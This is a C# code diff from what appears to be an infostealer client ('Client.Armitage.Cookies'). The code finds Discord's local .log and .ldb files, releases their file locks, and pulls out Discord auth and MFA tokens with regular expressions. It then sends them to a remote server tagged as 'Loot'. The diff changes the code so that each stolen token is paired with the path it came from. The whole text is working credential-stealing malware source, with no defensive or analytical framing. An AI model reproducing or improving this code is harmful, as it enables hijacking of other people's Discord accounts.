@@ -14,10 +14,10 @@ namespace Client.Armitage.Cookies
         /// <summary>
         /// Steals discord token from the Windows app.
         /// </summary>
-        public static List<string> Stealu()
+        public static List<Tuple<string, string>> Stealu()
         {
 
-            List<string> discordtokens = new List<string>();
+            List<Tuple<string, string>> discordtokens = new List<Tuple<string, string>>();
 
             string[] paths = new string[] {
                 // discord pc
@@ -40,16 +40,20 @@ namespace Client.Armitage.Cookies
                 if (rootfolder.Exists)
                 {
                     var logfiles = Utilities.Files_And_Pathing.GetFilesByExtensions(rootfolder, ".log", ".ldb");
+
                     foreach (var file in logfiles)
                     {
+                        Utilities.Files_And_Pathing.KillLocks(file.FullName);
 
                         string readedfile = file.OpenText().ReadToEnd();
 
                         foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
-                            discordtokens.Add($"Token from {i}\r\n" + match.Value + "\n");
+                        {
+                            discordtokens.Add(new Tuple<string, string>(i, match.Value));
+                        }
 
                         foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
-                            discordtokens.Add($"Token from {i}\r\n" + match.Value + "\n");
+                            discordtokens.Add(new Tuple<string, string>(i, match.Value));
                     }
                 }
                 else
@@ -57,7 +61,7 @@ namespace Client.Armitage.Cookies
                     Console.WriteLine($"path doesnt exist : {i}");
                 }
             }
-            return discordtokens.ToList();
+            return discordtokens;
         }
 
         public static string GetTokenFromLogDir(string dir)
@@ -84,7 +88,7 @@ namespace Client.Armitage.Cookies
         /// <summary>
         /// Sends the discord token to the server.
         /// </summary>
-        public async static void Send(IEnumerable<string> tokens)
+        public async static void Send(List<Tuple<string, string>> tokens)
         {
             await Task.Run(() =>
             {
@@ -96,7 +100,7 @@ namespace Client.Armitage.Cookies
 
                 foreach (var i in tokens)
                 {
-                    sb.AppendLine(i);
+                    sb.AppendLine($"From: {i.Item1} Got: {i.Item2}");
                 }
 
                 Communication.String_Stacker.Send(sb.ToString(), Communication.String_Stacker.StringType.Loot);
